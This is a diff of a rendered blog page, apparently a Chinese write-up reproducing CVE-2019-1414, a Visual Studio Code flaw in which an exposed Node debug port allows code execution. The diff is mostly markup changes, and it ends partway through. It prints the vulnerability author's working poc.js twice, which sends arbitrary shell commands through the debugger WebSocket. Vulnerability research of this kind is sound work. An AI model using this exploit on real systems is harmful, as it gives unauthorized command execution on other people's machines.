@@ -23,7 +23,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.79.1 with theme even" />
+<meta name="generator" content="Hugo 0.106.0 with theme even" />
 
 
 <link rel="canonical" href="https://b1tg.github.io/post/vscode-local-execute/" />
@@ -35,26 +35,22 @@
 
 
 
-<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="/sass/main.min.b5a744db6de49a86cadafb3b70f555ab443f83c307a483402259e94726b045ff.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
 
 
 <meta property="og:title" content="Visual Studio Code本地代码执行漏洞" />
 <meta property="og:description" content="CVE-2019-1414漏洞复现与分析" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://b1tg.github.io/post/vscode-local-execute/" />
+<meta property="og:url" content="https://b1tg.github.io/post/vscode-local-execute/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2019-11-05T12:54:02+08:00" />
 <meta property="article:modified_time" content="2019-11-05T12:54:02+08:00" />
+
 <meta itemprop="name" content="Visual Studio Code本地代码执行漏洞">
-<meta itemprop="description" content="CVE-2019-1414漏洞复现与分析">
-<meta itemprop="datePublished" content="2019-11-05T12:54:02+08:00" />
+<meta itemprop="description" content="CVE-2019-1414漏洞复现与分析"><meta itemprop="datePublished" content="2019-11-05T12:54:02+08:00" />
 <meta itemprop="dateModified" content="2019-11-05T12:54:02+08:00" />
-<meta itemprop="wordCount" content="2366">
-
-
-
-<meta itemprop="keywords" content="漏洞分析," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="wordCount" content="2367">
+<meta itemprop="keywords" content="漏洞分析," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Visual Studio Code本地代码执行漏洞"/>
 <meta name="twitter:description" content="CVE-2019-1414漏洞复现与分析"/>
 
@@ -162,20 +158,20 @@
 <p>打开下载的vscode。通过ps可以看到，vscode默认开启了一个nodejs调试端口(<code>--inspect=13611</code>)。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ps aux <span class="p">|</span>grep inspect
-ch               <span class="m">95536</span>   0.0  0.7  <span class="m">4815292</span>  <span class="m">56884</span>   ??  S     9:59上午   0:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect<span class="o">=</span><span class="m">13611</span> /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type<span class="o">=</span>extensionHost
-ch               <span class="m">95748</span>   0.0  0.0  <span class="m">4286472</span>    <span class="m">840</span> s003  S+   10:42上午   0:00.01 grep --color<span class="o">=</span>auto --exclude-dir<span class="o">=</span>.bzr --exclude-dir<span class="o">=</span>CVS --exclude-dir<span class="o">=</span>.git --exclude-dir<span class="o">=</span>.hg --exclude-dir<span class="o">=</span>.svn inspect
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ps aux <span class="p">|</span>grep inspect
+</span></span><span class="line"><span class="cl">ch               <span class="m">95536</span>   0.0  0.7  <span class="m">4815292</span>  <span class="m">56884</span>   ??  S     9:59上午   0:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect<span class="o">=</span><span class="m">13611</span> /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type<span class="o">=</span>extensionHost
+</span></span><span class="line"><span class="cl">ch               <span class="m">95748</span>   0.0  0.0  <span class="m">4286472</span>    <span class="m">840</span> s003  S+   10:42上午   0:00.01 grep --color<span class="o">=</span>auto --exclude-dir<span class="o">=</span>.bzr --exclude-dir<span class="o">=</span>CVS --exclude-dir<span class="o">=</span>.git --exclude-dir<span class="o">=</span>.hg --exclude-dir<span class="o">=</span>.svn inspect
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们可以通过api查看以下信息：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -189,26 +185,26 @@ ch               <span class="m">95748</span>   0.0  0.0  <span class="m">428647
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh">$ curl http://127.0.0.1:13611/json
-<span class="o">[</span> <span class="o">{</span>
-  <span class="s2">&#34;description&#34;</span>: <span class="s2">&#34;node.js instance&#34;</span>,
-  <span class="s2">&#34;devtoolsFrontendUrl&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
-  <span class="s2">&#34;devtoolsFrontendUrlCompat&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
-  <span class="s2">&#34;faviconUrl&#34;</span>: <span class="s2">&#34;https://nodejs.org/static/favicon.ico&#34;</span>,
-  <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
-  <span class="s2">&#34;title&#34;</span>: <span class="s2">&#34;/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]&#34;</span>,
-  <span class="s2">&#34;type&#34;</span>: <span class="s2">&#34;node&#34;</span>,
-  <span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;file://&#34;</span>,
-  <span class="s2">&#34;webSocketDebuggerUrl&#34;</span>: <span class="s2">&#34;ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>
-<span class="o">}</span> <span class="o">]</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ curl http://127.0.0.1:13611/json
+</span></span><span class="line"><span class="cl"><span class="o">[</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;description&#34;</span>: <span class="s2">&#34;node.js instance&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;devtoolsFrontendUrl&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/js_app.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;devtoolsFrontendUrlCompat&#34;</span>: <span class="s2">&#34;chrome-devtools://devtools/bundled/inspector.html?experiments=true&amp;v8only=true&amp;ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;faviconUrl&#34;</span>: <span class="s2">&#34;https://nodejs.org/static/favicon.ico&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span>: <span class="s2">&#34;09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;title&#34;</span>: <span class="s2">&#34;/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;type&#34;</span>: <span class="s2">&#34;node&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;file://&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;webSocketDebuggerUrl&#34;</span>: <span class="s2">&#34;ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span> <span class="o">]</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在chrome中直接打开这里<code>devtoolsFrontendUrl</code>指向的链接，就可以得到一个调试终端，可以在里面执行js指令。</p>
 <p><img src="/img/vscode-local-execute/image-20191105125403677.png" alt="image-20191105125403677"></p>
 <p>漏洞作者给出的poc如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -294,137 +290,137 @@ ch               <span class="m">95748</span>   0.0  0.0  <span class="m">428647
 </span><span class="lnt">84
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="c1">//poc.js
-</span><span class="c1"></span><span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-fetch&#39;</span><span class="p">)</span>
-<span class="kr">const</span> <span class="nx">WebSocket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ws&#39;</span><span class="p">)</span>
-
-<span class="kd">function</span> <span class="nx">die</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">reason</span><span class="p">)</span>
-  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
-<span class="p">}</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nx">die</span><span class="p">(</span><span class="s1">&#39;usage: node index.js &lt;IP&gt; &lt;PORT&gt; &lt;COMMAND&gt;&#39;</span><span class="p">)</span>
-<span class="p">}</span>
-
-<span class="kr">const</span> <span class="nx">IP</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-<span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
-<span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
-
-<span class="kd">function</span> <span class="nx">base64</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
-<span class="p">}</span>
-
-<span class="kr">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
-  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
-  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
-  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
-<span class="p">}</span>
-
-<span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Getting webSocketDebuggerUrl from http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
-  <span class="kr">const</span> <span class="nx">wsLink</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getWsLink</span><span class="p">().</span><span class="k">catch</span><span class="p">(</span><span class="nx">die</span><span class="p">)</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Found webSocketDebuggerUrl: </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-  <span class="kr">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">wsLink</span><span class="p">)</span>
-
-  <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Connection established to </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.enable&#39;</span> <span class="p">}))</span>
-    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
-      <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
-      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
-      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
-        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}`</span>
-      <span class="p">}</span>
-    <span class="p">}))</span>
-
-    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
-      <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span>
-      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
-      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
-        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}`</span>
-      <span class="p">}</span>
-    <span class="p">}))</span>
-
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Executing: </span><span class="si">${</span><span class="nx">COMMAND</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
-    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
-      <span class="nx">id</span><span class="o">:</span> <span class="mi">3</span><span class="p">,</span>
-      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
-      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
-        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawnSync(&#39;/bin/bash&#39;, [&#39;-c&#39;, &#39;echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash&#39;])`</span>
-      <span class="p">}</span>
-    <span class="p">}))</span>
-
-    <span class="nx">socket</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
-  <span class="p">}</span>
-
-  <span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="c1">// console.log(event)
-</span><span class="c1"></span>  <span class="p">}</span>
-
-  <span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="c1">// console.log(event)
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">wasClean</span><span class="p">)</span> <span class="p">{</span>
-      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection closed cleanly&#39;</span><span class="p">)</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[?] Connection died&#39;</span><span class="p">)</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-
-  <span class="nx">socket</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">)</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="nx">main</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">//poc.js
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">fetch</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-fetch&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">WebSocket</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ws&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">die</span> <span class="p">(</span><span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">reason</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">.</span><span class="nx">length</span> <span class="o">!==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">die</span><span class="p">(</span><span class="s1">&#39;usage: node index.js &lt;IP&gt; &lt;PORT&gt; &lt;COMMAND&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">IP</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">base64</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">getWsLink</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="sb">`http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">webSocketDebuggerUrl</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Getting webSocketDebuggerUrl from http://</span><span class="si">${</span><span class="nx">IP</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">/json`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">wsLink</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getWsLink</span><span class="p">().</span><span class="k">catch</span><span class="p">(</span><span class="nx">die</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[!] Found webSocketDebuggerUrl: </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">wsLink</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[?] Connection established to </span><span class="si">${</span><span class="nx">wsLink</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.enable&#39;</span> <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">expression</span><span class="o">:</span> <span class="sb">`spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}`</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">id</span><span class="o">:</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;Runtime.evaluate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">params</span><span class="o">:</span> <span class="p">{</span>
